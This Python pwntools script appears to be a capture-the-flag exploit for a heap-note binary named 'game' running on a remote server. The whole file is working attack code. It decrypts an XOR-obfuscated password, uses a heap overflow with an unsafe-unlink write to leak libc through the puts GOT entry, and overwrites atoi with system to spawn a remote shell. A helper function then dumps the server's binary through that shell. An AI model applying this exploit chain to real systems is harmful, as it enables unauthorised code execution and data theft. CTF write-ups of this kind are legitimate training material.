#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import os, sys

DEBUG = 3
context.arch = "amd64"
context.log_level = "debug"
elf = ELF("./game",checksec=False)

# synonyms for faster typing
tube.s = tube.send
tube.sl = tube.sendline
tube.sa = tube.sendafter
tube.sla = tube.sendlineafter
tube.r = tube.recv
tube.ru = tube.recvuntil
tube.rl = tube.recvline
tube.ra = tube.recvall
tube.rr = tube.recvregex
tube.irt = tube.interactive

if DEBUG == 1:
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	s = process("./game")
elif DEBUG == 2:
	libc = ELF("./libc.so.6",checksec=False)
	s = process("./game", env={"LD_PRELOAD":"./libc.so.6"})
elif DEBUG == 3:
	libc = ELF("./libc.so.6",checksec=False)
	ip = "165.227.31.152"
	port = 10001
	s = remote(ip,port)

def z(addr):
    raw_input("debug?")
    gdb.attach(s, "b *" + str(addr))

wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0
def leak(address, size):
   with open("/proc/%s/mem" % mypid) as mem:
      mem.seek(address)
      return mem.read(size)

def findModuleBase(pid, mem):
   name = os.readlink("/proc/%s/exe" % pid)
   with open("/proc/%s/maps" % pid) as maps:
      for line in maps:
         if name in line:
            addr = int(line.split("-")[0], 16)
            mem.seek(addr)
            if mem.read(4) == "\x7fELF":
               bitFormat = u8(leak(addr + 4, 1))
               if bitFormat == 2:
                  global wordSz
                  global hwordSz
                  global bits
                  wordSz = 8
                  hwordSz = 4
                  bits = 64
               return addr
   log.failure("Module's base address not found.")
   sys.exit(1)

def zx(addr = 0):
    global mypid
    mypid = proc.pidof(s)[0]
    raw_input("debug?")
    with open("/proc/%s/mem" % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
        gdb.attach(s, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))

def add(size):
	sleep(0.2)
	s.sendline('1')
	sleep(0.2)
	s.sendline(str(size))

def fill(index,len,data):
	sleep(0.2)
	s.sendline('3')
	sleep(0.2)
	s.sendline(str(index))
	sleep(0.2)
	s.sendline(str(len))
	sleep(0.2)
	s.send(data)

def show(index):
	sleep(0.2)
	s.sendline('4')
	sleep(0.2)
	s.sendline(str(index))

def delete(index):
	sleep(0.2)
	s.sendline('2')
	sleep(0.2)
	s.sendline(str(index))

xor = ""
def magic(plain):
   enc = ""
   for i in range(len(plain)):
      enc += chr(ord(plain[i]) ^ ord(xor[i]))
   
   return enc


def pwn():
   global xor 

   # Stage1: Bypass password
   enc = s.r()
   plain = "Pwning is awesome~\n"
   key = []
   for i in range(len(plain)):
      key.append(ord(plain[i]) ^ ord(enc[i]))
   print key

   sleep(0.5)
   s.sl("8")
   
   password = '3xpL0r3R'
   enc = ''
   for i in range(len(password)):
      enc += chr(ord(password[i]) ^ key[i])

   sleep(0.5)
   s.s(enc)

   # Stage2: Leak
   add(0x200)  #0
   add(0x108)  #1
   add(0x108)  #2
   add(0x108)  #3

   plain = "\x00" * (0x200 - 1)
   fill(0, 0x200 - 1, plain)

   show(0)
   s.ru('Note 0\n')

   xor = s.r(0x180)
   print "key:" + xor

   pl = ''
   pl += '\x00'*(0x100 - 0x10)
   pl += p64(0x100) + p64(0x111)
   enc = magic(pl)
   fill(2, 0x100, enc)

   #z()
   pl = ''
   pl += p64(0) + p64(0x101)
   pl += p64(0x602120 + 0x10 - 0x18) + p64(0x602120 + 0x10 - 0x10)
   pl += '\x00'*(0x100 - 32)
   pl += p64(0x100)
   enc = magic(pl)
   fill(1, 0x108, enc)

   #z()
   delete(2)

   pl = ''
   pl += p64(0) + p64(elf.got['puts'])
   enc = magic(pl)
   #z()
   fill(1, 0x10 + 1, enc)

   #z()
   show(0)
   s.recvuntil('Note 0\n')

   puts_addr = u64(s.recv(6).ljust(8,'\x00'))
   print 'puts_addr:'+hex(puts_addr)
   libc_base = puts_addr - libc.symbols['puts']
   print 'libc_base:' + hex(libc_base)
   system_addr = libc_base + libc.symbols['system']
   print 'system_addr:'+hex(system_addr)

   # Stage3: shell
   pl = ''
   pl += p64(0) + p64(elf.got['atoi']) + p64(0x10)
   enc = magic(pl)
   fill(1, 0x18 + 1, enc)

   #z()
   pl = ''
   pl += p64(system_addr)
   enc = magic(pl)
   fill(0, 8 + 1, enc)

   #z()
   sleep(0.2)
   s.sendline('/bin/sh\x00')

   s.irt()

def dump():
	pwn()
	s.recv(timeout=1)
	s.sl("cat game")
	s.sl("exit")
	data = s.ra()
	f = open("dump", "wb")
	f.write(data)
	f.close()

if __name__ == "__main__":
    pwn()